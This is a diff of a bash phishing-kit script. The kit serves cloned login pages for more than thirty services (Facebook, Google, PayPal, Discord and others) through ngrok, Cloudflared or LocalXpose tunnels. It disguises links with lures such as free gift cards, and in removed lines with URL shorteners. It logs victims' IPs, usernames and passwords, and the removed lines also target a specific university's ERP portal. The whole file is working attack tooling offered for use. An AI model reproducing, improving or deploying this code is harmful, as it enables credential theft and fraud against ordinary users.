-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	if [[ "$1" == *"shrtco.de"* ]]; then
-		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-	else
-		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
-		processed_url=${short#http*//}
-	fi
-}
-
-custom_url() {
-	url=${1#http*//}
-	isgd="https://www.is.gd/create.php?format=simple&url="
-	shortcode="https://api.shrtco.de/v2/shorten?url="
-	tinyurl="https://tinyurl.com/api-create.php?url="
-
-	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
-
-		url="https://$url"
-		masked_url="$mask@www.$processed_url"
-		processed_url="https://$processed_url"
-	else
-		# echo "[!] No url provided / Regex Not Matched"
-		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
-	fi
-
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
-}
-
+## Setup website and start php server
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
+	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
 capture_ip() {
-	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
-	cat .server/www/ip.txt >> ip.txt
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	cat .server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
@@ -515,8 +425,8 @@ capture_creds() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
-	cat .server/www/usernames.txt >> usernames.dat
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	cat .server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
@@ -541,66 +451,94 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	custom_port
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && ngrok_region="eu" || ngrok_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
-    fi
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+	fi
 
 	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-	custom_url "$ngrok_url"
-	# ngrok_url1=${ngrok_url#https://}
-	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+	ngrok_url1=${ngrok_url#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
 
-
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
-
 ## Start Cloudflared
 start_cloudflared() { 
-        rm .cld.log > /dev/null 2>&1 &
-	custom_port
+	rm .cld.log > /dev/null 2>&1 &
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-    if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
-    fi
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	else
+		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+	fi
 
 	{ sleep 8; clear; banner_small; }
 	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-	custom_url "$cldflr_link"
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	capture_data
+}
 
-	# cldflr_link1=${cldflr_link#https://}
-	
-	# Bash Script for Hide Phishing URL Created by KP
-	
-	# short=$(curl -s https://www.is.gd/create.php\?format\=simple\&url\=${cldflr_link})
-	# shorter=${short#https://}
-	# final=$shorter
-	# echo -e "Here is the Advanced URL:\e[32m ${final} \e[0m\n"
-	
-	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
-	# echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${GREEN}$mask@$final"
-	
+localxpose_auth() {
+	./.server/loclx -help > /dev/null 2>&1 &
+	sleep 1
+	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access" 
+
+	[ "$(./.server/loclx account status | grep Error)" ] && {
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		sleep 3
+		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_token
+		[[ $loclx_token == "" ]] && {
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
+		} || {
+			echo -n "$loclx_token" > $auth_f 2> /dev/null
+		}
+	}
+}
+
+## Start LocalXpose (Again...)
+start_loclx() {
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; localxpose_auth; }
+	echo -e "\n"
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
+
+	if [[ `command -v termux-chroot` ]]; then
+		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	else
+		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
+	fi
+
+	{ sleep 12; clear; banner_small; }
+	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}http://$loclx_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$loclx_url"
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
+	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
@@ -613,9 +551,10 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
-		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Account Needed${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
@@ -628,62 +567,23 @@ tunnel_menu() {
 			start_ngrok;;
 		3 | 03)
 			start_cloudflared;;
+		4 | 04)
+			start_loclx;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
 	esac
 }
 
-##PSIT
-site_psit() {
-	cat <<-EOF
-		${GREEN}****************************************************************************************************************
-		${RED}[${WHITE}01${RED}]${ORANGE} Psit Normal Portal
-		${RED}[${WHITE}02${RED}]${ORANGE} Psitche Normal Portal
-		${RED}[${WHITE}03${RED}]${ORANGE} Increase Presenty
-		${RED}[${WHITE}04${RED}]${ORANGE} Search About Students
-		${RED}[${WHITE}05${RED}]${ORANGE} Advanced Page
-		${GREEN}****************************************************************************************************************
-	EOF
-	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="psit"
-			mask='https://erp.psit.ac.in'
-			tunnel_menu;;
-		2 | 02)
-			website="psit"
-			mask='https://erp.psitche.ac.in'
-			tunnel_menu;;
-		3 | 03)
-			website="psit"
-			mask='https://erp.psitche.ac.in-ERP-Student-Attendance'
-			tunnel_menu;;
-		4 | 04)
-			website="psit"
-			mask='https://erp.psitche.ac.in-SearchStudents'
-			tunnel_menu;;
-		5 | 05)
-			website="psit"
-			mask='https://erp.psitche.ac.in-accessing'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_psit; };;
-	esac
-}
-
 ## Facebook
 site_facebook() {
 	cat <<- EOF
-		${GREEN}****************************************************************************************************************
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
-		${GREEN}****************************************************************************************************************
+
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -714,16 +614,16 @@ site_facebook() {
 ## Instagram
 site_instagram() {
 	cat <<- EOF
-		${GREEN}****************************************************************************************************************
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-		${GREEN}****************************************************************************************************************
+
 	EOF
-	
+
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-	
+
 	case $REPLY in 
 		1 | 01)
 			website="instagram"
@@ -750,11 +650,11 @@ site_instagram() {
 ## Gmail/Google
 site_gmail() {
 	cat <<- EOF
-		${GREEN}****************************************************************************************************************
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
-		${GREEN}****************************************************************************************************************
+
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -781,10 +681,10 @@ site_gmail() {
 ## Vk
 site_vk() {
 	cat <<- EOF
-		${GREEN}****************************************************************************************************************
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
 		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${GREEN}****************************************************************************************************************
+
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -809,7 +709,7 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-		${GREEN}****************************************************************************************************************										
+
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
@@ -821,10 +721,9 @@ main_menu() {
 		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} ApnaPSIT      ${RED}[${WHITE}35${RED}]${ORANGE} Discord      ${RED}[${WHITE}36${RED}]${ORANGE} GoogleCloud
+		${RED}[${WHITE}34${RED}]${ORANGE} Discord
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
-		${GREEN}****************************************************************************************************************
 
 	EOF
 	
@@ -839,131 +738,125 @@ main_menu() {
 			site_gmail;;
 		4 | 04)
 			website="microsoft"
-			mask='https://unlimited-onedrive-space-for-free'
+			mask='http://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
 		5 | 05)
 			website="netflix"
-			mask='https://upgrade-your-netflix-plan-free'
+			mask='http://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
 		6 | 06)
 			website="paypal"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		7 | 07)
 			website="steam"
-			mask='https://steam-500-usd-gift-card-free'
+			mask='http://steam-500-usd-gift-card-free'
 			tunnel_menu;;
 		8 | 08)
 			website="twitter"
-			mask='https://get-blue-badge-on-twitter-free'
+			mask='http://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
 		9 | 09)
 			website="playstation"
-			mask='https://playstation-500-usd-gift-card-free'
+			mask='http://playstation-500-usd-gift-card-free'
 			tunnel_menu;;
 		10)
 			website="tiktok"
-			mask='https://tiktok-free-liker'
+			mask='http://tiktok-free-liker'
 			tunnel_menu;;
 		11)
 			website="twitch"
-			mask='https://unlimited-twitch-tv-user-for-free'
+			mask='http://unlimited-twitch-tv-user-for-free'
 			tunnel_menu;;
 		12)
 			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
+			mask='http://get-a-premium-plan-for-pinterest-free'
 			tunnel_menu;;
 		13)
 			website="snapchat"
-			mask='https://view-locked-snapchat-accounts-secretly'
+			mask='http://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
 		14)
 			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
+			mask='http://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
 		15)
 			website="ebay"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		16)
 			website="quora"
-			mask='https://quora-premium-for-free'
+			mask='http://quora-premium-for-free'
 			tunnel_menu;;
 		17)
 			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
+			mask='http://protonmail-pro-basics-for-free'
 			tunnel_menu;;
 		18)
 			website="spotify"
-			mask='https://convert-your-account-to-spotify-premium'
+			mask='http://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
 		19)
 			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
+			mask='http://reddit-official-verified-member-badge'
 			tunnel_menu;;
 		20)
 			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
+			mask='http://get-adobe-lifetime-pro-membership-free'
 			tunnel_menu;;
 		21)
 			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		22)
 			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		23)
 			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		24)
 			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
+			mask='http://get-1TB-cloud-storage-free'
 			tunnel_menu;;
 		25)
 			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			mask='http://grab-mail-from-anyother-yahoo-account-free'
 			tunnel_menu;;
 		26)
 			website="wordpress"
-			mask='https://unlimited-wordpress-traffic-free'
+			mask='http://unlimited-wordpress-traffic-free'
 			tunnel_menu;;
 		27)
 			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
+			mask='http://grab-mail-from-anyother-yandex-account-free'
 			tunnel_menu;;
 		28)
 			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			mask='http://get-stackoverflow-lifetime-pro-membership-free'
 			tunnel_menu;;
 		29)
 			site_vk;;
 		30)
 			website="xbox"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		31)
 			website="mediafire"
-			mask='https://get-1TB-on-mediafire-free'
+			mask='http://get-1TB-on-mediafire-free'
 			tunnel_menu;;
 		32)
 			website="gitlab"
-			mask='https://get-1k-followers-on-gitlab-free'
+			mask='http://get-1k-followers-on-gitlab-free'
 			tunnel_menu;;
 		33)
 			website="github"
-			mask='https://get-1k-followers-on-github-free'
+			mask='http://get-1k-followers-on-github-free'
 			tunnel_menu;;
 		34)
-			site_psit;;
-		35)
 			website="discord"
-			mask='https://get-discord-nitro-free'
-			tunnel_menu;;
-		36)
-			website="cloud"
-			mask='https://www.cloudskillsboost.google-users-sign_in'
+			mask='http://get-discord-nitro-free'
 			tunnel_menu;;
 		99)
 			about;;
@@ -979,7 +872,8 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
-# check_status
+check_status
 install_ngrok
 install_cloudflared
+install_localxpose
 main_menu
